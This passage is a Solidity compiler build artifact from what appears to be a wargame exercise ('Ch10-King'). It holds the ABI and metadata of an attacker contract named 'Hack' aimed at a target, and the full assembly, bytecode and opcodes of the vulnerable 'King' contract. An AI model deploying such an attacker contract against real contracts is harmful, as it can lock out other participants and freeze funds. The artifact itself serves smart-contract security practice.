										},
										{
											"begin": 1716,
											"end": 1745,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1678,
											"end": 1751,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1678,
											"end": 1751,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1678,
											"end": 1751,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1678,
											"end": 1751,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1678,
											"end": 1751,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"playGame()": "af899735"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.0+commit.c7dfd78e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_target\",\"type\":\"address\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"playGame\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Ch10-King.sol\":\"Hack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Ch10-King.sol\":{\"keccak256\":\"0xaea41b863917dd335dc69fbbf1e62050c996f8cecac4a7440d3d1f4013cc2e37\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://59f53524c78967bc2a789697aeac1471d6497b1d87b343d39b56db9870335679\",\"dweb:/ipfs/QmWe3bBvtDpn28qCiJvsUq1w5CwaALPkyGUdjowgW6p5v1\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 4,
								"contract": "contracts/Ch10-King.sol:Hack",
								"label": "target",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(King)115"
							}
						],
						"types": {
							"t_contract(King)115": {
								"encoding": "inplace",
								"label": "contract King",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"King": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "payable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "_king",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "prize",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/Ch10-King.sol\":414:868  contract King {\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Ch10-King.sol\":538:548  msg.sender */\n  caller\n    /* \"contracts/Ch10-King.sol\":530:535  owner */\n  0x02\n  0x00\n    /* \"contracts/Ch10-King.sol\":530:548  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Ch10-King.sol\":564:574  msg.sender */\n  caller\n    /* \"contracts/Ch10-King.sol\":557:561  king */\n  0x00\n  dup1\n    /* \"contracts/Ch10-King.sol\":557:574  king = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Ch10-King.sol\":589:598  msg.value */\n  callvalue\n    /* \"contracts/Ch10-King.sol\":581:586  prize */\n  0x01\n    /* \"contracts/Ch10-King.sol\":581:598  prize = msg.value */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"contracts/Ch10-King.sol\":414:868  contract King {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Ch10-King.sol\":414:868  contract King {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x29cc6d6f\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xe3ac5d26\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"contracts/Ch10-King.sol\":665:670  prize */\n      sload(0x01)\n        /* \"contracts/Ch10-King.sol\":652:661  msg.value */\n      callvalue\n        /* \"contracts/Ch10-King.sol\":652:670  msg.value >= prize */\n      lt\n      iszero\n        /* \"contracts/Ch10-King.sol\":652:693  msg.value >= prize || msg.sender == owner */\n      dup1\n      tag_8\n      jumpi\n      pop\n        /* \"contracts/Ch10-King.sol\":688:693  owner */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ch10-King.sol\":674:693  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ch10-King.sol\":674:684  msg.sender */\n      caller\n        /* \"contracts/Ch10-King.sol\":674:693  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Ch10-King.sol\":652:693  msg.value >= prize || msg.sender == owner */\n    tag_8:\n        /* \"contracts/Ch10-King.sol\":644:694  require(msg.value >= prize || msg.sender == owner) */\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n        /* \"contracts/Ch10-King.sol\":709:713  king */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ch10-King.sol\":701:723  payable(king).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ch10-King.sol\":701:734  payable(king).transfer(msg.value) */\n      0x08fc\n        /* \"contracts/Ch10-King.sol\":724:733  msg.value */\n      callvalue\n        /* \"contracts/Ch10-King.sol\":701:734  payable(king).transfer(msg.value) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_11\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_11:\n      pop\n        /* \"contracts/Ch10-King.sol\":748:758  msg.sender */\n      caller\n        /* \"contracts/Ch10-King.sol\":741:745  king */\n      0x00\n      dup1\n        /* \"contracts/Ch10-King.sol\":741:758  king = msg.sender */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Ch10-King.sol\":773:782  msg.value */\n      callvalue\n        /* \"contracts/Ch10-King.sol\":765:770  prize */\n      0x01\n        /* \"contracts/Ch10-King.sol\":765:782  prize = msg.value */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Ch10-King.sol\":414:868  contract King {\r... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Ch10-King.sol\":794:865  function _king() public view returns (address) {\r... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      tag_15\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Ch10-King.sol\":474:494  address public owner */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_17\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_17:\n      pop\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      tag_20\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Ch10-King.sol\":452:469  uint public prize */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_21\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_21:\n      pop\n      tag_22\n      tag_23\n      jump\t// in\n    tag_22:\n      mload(0x40)\n      tag_24\n      swap2\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Ch10-King.sol\":794:865  function _king() public view returns (address) {\r... */\n    tag_14:\n        /* \"contracts/Ch10-King.sol\":832:839  address */\n      0x00\n        /* \"contracts/Ch10-King.sol\":855:859  king */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ch10-King.sol\":848:859  return king */\n      swap1\n      pop\n        /* \"contracts/Ch10-King.sol\":794:865  function _king() public view returns (address) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/Ch10-King.sol\":474:494  address public owner */\n    tag_19:\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Ch10-King.sol\":452:469  uint public prize */\n    tag_23:\n      sload(0x01)\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:125   */\n    tag_28:\n        /* \"#utility.yul\":94:118   */\n      tag_30\n        /* \"#utility.yul\":112:117   */\n      dup2\n        /* \"#utility.yul\":94:118   */\n      tag_31\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":89:92   */\n      dup3\n        /* \"#utility.yul\":82:119   */\n      mstore\n        /* \"#utility.yul\":72:125   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":131:249   */\n    tag_32:\n        /* \"#utility.yul\":218:242   */\n      tag_34\n        /* \"#utility.yul\":236:241   */\n      dup2\n        /* \"#utility.yul\":218:242   */\n      tag_35\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":213:216   */\n      dup3\n        /* \"#utility.yul\":206:243   */\n      mstore\n        /* \"#utility.yul\":196:249   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":255:477   */\n    tag_16:\n      0x00\n        /* \"#utility.yul\":386:388   */\n      0x20\n        /* \"#utility.yul\":375:384   */\n      dup3\n        /* \"#utility.yul\":371:389   */\n      add\n        /* \"#utility.yul\":363:389   */\n      swap1\n      pop\n        /* \"#utility.yul\":399:470   */\n      tag_37\n        /* \"#utility.yul\":467:468   */\n      0x00\n        /* \"#utility.yul\":456:465   */\n      dup4\n        /* \"#utility.yul\":452:469   */\n      add\n        /* \"#utility.yul\":443:449   */\n      dup5\n        /* \"#utility.yul\":399:470   */\n      tag_28\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":353:477   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":483:705   */\n    tag_25:\n      0x00\n        /* \"#utility.yul\":614:616   */\n      0x20\n        /* \"#utility.yul\":603:612   */\n      dup3\n        /* \"#utility.yul\":599:617   */\n      add\n        /* \"#utility.yul\":591:617   */\n      swap1\n      pop\n        /* \"#utility.yul\":627:698   */\n      tag_39\n        /* \"#utility.yul\":695:696   */\n      0x00\n        /* \"#utility.yul\":684:693   */\n      dup4\n        /* \"#utility.yul\":680:697   */\n      add\n        /* \"#utility.yul\":671:677   */\n      dup5\n        /* \"#utility.yul\":627:698   */\n      tag_32\n      jump\t// in\n    tag_39:\n        /* \"#utility.yul\":581:705   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":711:807   */\n    tag_31:\n      0x00\n        /* \"#utility.yul\":777:801   */\n      tag_41\n        /* \"#utility.yul\":795:800   */\n      dup3\n        /* \"#utility.yul\":777:801   */\n      tag_42\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":766:801   */\n      swap1\n      pop\n        /* \"#utility.yul\":756:807   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":813:939   */\n    tag_42:\n      0x00\n        /* \"#utility.yul\":890:932   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":883:888   */\n      dup3\n        /* \"#utility.yul\":879:933   */\n      and\n        /* \"#utility.yul\":868:933   */\n      swap1\n      pop\n        /* \"#utility.yul\":858:939   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":945:1022   */\n    tag_35:\n      0x00\n        /* \"#utility.yul\":1011:1016   */\n      dup2\n        /* \"#utility.yul\":1000:1016   */\n      swap1\n      pop\n        /* \"#utility.yul\":990:1022   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220f7318525284d531aa033bf87a2940846543c74e2ea0cbab6f9646c3482c91ef864736f6c63430008000033\n}\n",
						"bytecode": {
							"generatedSources": [],
							"linkReferences": {},
							"object": "608060405233600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550346001819055506102f58061009b6000396000f3fe6080604052600436106100385760003560e01c806329cc6d6f146101595780638da5cb5b14610184578063e3ac5d26146101af57610154565b36610154576001543410158061009b5750600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b6100a457600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc349081150290604051600060405180830381858888f1935050505015801561010a573d6000803e3d6000fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034600181905550005b600080fd5b34801561016557600080fd5b5061016e6101da565b60405161017b919061024d565b60405180910390f35b34801561019057600080fd5b50610199610203565b6040516101a6919061024d565b60405180910390f35b3480156101bb57600080fd5b506101c4610229565b6040516101d19190610268565b60405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b61023881610283565b82525050565b610247816102b5565b82525050565b6000602082019050610262600083018461022f565b92915050565b600060208201905061027d600083018461023e565b92915050565b600061028e82610295565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600081905091905056fea2646970667358221220f7318525284d531aa033bf87a2940846543c74e2ea0cbab6f9646c3482c91ef864736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLER PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH2 0x2F5 DUP1 PUSH2 0x9B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x29CC6D6F EQ PUSH2 0x159 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x184 JUMPI DUP1 PUSH4 0xE3AC5D26 EQ PUSH2 0x1AF JUMPI PUSH2 0x154 JUMP JUMPDEST CALLDATASIZE PUSH2 0x154 JUMPI PUSH1 0x1 SLOAD CALLVALUE LT ISZERO DUP1 PUSH2 0x9B JUMPI POP PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST PUSH2 0xA4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC CALLVALUE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x10A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE PUSH1 0x1 DUP2 SWAP1 SSTORE POP STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x165 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x16E PUSH2 0x1DA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x17B SWAP2 SWAP1 PUSH2 0x24D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x190 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x199 PUSH2 0x203 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1A6 SWAP2 SWAP1 PUSH2 0x24D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1BB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1C4 PUSH2 0x229 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1D1 SWAP2 SWAP1 PUSH2 0x268 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH2 0x238 DUP2 PUSH2 0x283 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x247 DUP2 PUSH2 0x2B5 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x262 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x22F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x27D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x23E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x28E DUP3 PUSH2 0x295 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xF7 BALANCE DUP6 0x25 0x28 0x4D MSTORE8 BYTE LOG0 CALLER 0xBF DUP8 LOG2 SWAP5 ADDMOD CHAINID SLOAD EXTCODECOPY PUSH21 0xE2EA0CBAB6F9646C3482C91EF864736F6C63430008 STOP STOP CALLER ",
							"sourceMap": "414:454:0:-:0;;;538:10;530:5;;:18;;;;;;;;;;;;;;;;;;564:10;557:4;;:17;;;;;;;;;;;;;;;;;;589:9;581:5;:17;;;;414:454;;;;;;"
						},
						"deployedBytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1025:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "72:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "89:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "112:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "94:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "94:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "82:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "82:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "82:37:1"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "60:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "67:3:1",
														"type": ""
													}
												],
												"src": "7:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "196:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "213:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "236:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "218:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "218:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "206:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "206:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "206:37:1"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "184:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "191:3:1",
														"type": ""
													}
												],
												"src": "131:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "353:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "363:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "375:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "386:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "371:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "371:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "363:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "443:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "456:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "467:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "452:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "452:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "399:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "399:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "399:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "325:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "337:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "348:4:1",
														"type": ""
													}
												],
												"src": "255:222:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "581:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "591:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "603:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "614:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "599:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "599:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "591:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "671:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "684:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "695:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "680:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "680:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "627:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "627:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "627:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "553:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "565:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "576:4:1",
														"type": ""
													}
												],
												"src": "483:222:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "756:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "766:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "795:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "777:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "777:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
